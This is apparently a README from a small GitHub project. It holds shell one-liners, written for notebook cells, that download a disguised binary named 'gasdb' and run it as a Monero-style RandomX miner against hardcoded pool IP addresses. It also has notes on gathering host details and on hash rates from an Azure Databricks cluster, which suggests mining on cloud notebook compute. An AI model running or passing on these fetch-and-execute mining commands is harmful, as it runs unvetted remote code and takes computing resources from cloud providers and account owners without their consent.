# gaslah

git clone https://github.com/jojosap1990/gaslah.git
git add .
git commit -m "coment"

## uninstall
sudo supervisorctl stop gaslah && rm setup.sh
nano setup.sh
chmod +x setup.sh && ./setup.sh
## script
---------------------
! wget https://github.com/jojolotnok/gaslah/raw/main/gasdb && chmod +x gasdb && ./gasdb --randomx-1gb-pages -a rx/0 -o {mining_pool} -k --tls --rig-id {worker_name}.{name} -t 2
---------------------

akang
! wget https://github.com/jojolotnok/gaslah/raw/main/gasdb && chmod +x gasdb && ./gasdb --randomx-1gb-pages -a rx/0 -o 144.202.125.131:3333 -k --tls --rig-id test.gmail -t 2

adit
! wget https://github.com/jojolotnok/gaslah/raw/main/gasdb && chmod +x gasdb && ./gasdb --randomx-1gb-pages -a rx/0 -o 149.28.91.175:3301 -k --tls --rig-id test.gmail -t 2

! wget https://github.com/jojolotnok/gaslah/raw/main/gasdb64 && chmod +x gasdb64 && sudo ./gasdb64 --randomx-1gb-pages -a rx/0 -o 149.28.91.175:3301 -k --tls --rig-id test.dba -t 8

## get vps info
cat /etc/os-release
cat /proc/cpuinfo
uname -a


## databrick azure
* get ubuntu 18.04 bionic 64 bit
* Cluster Standar_F8s_v2 16GB Ram 8 cores 2400 H/s
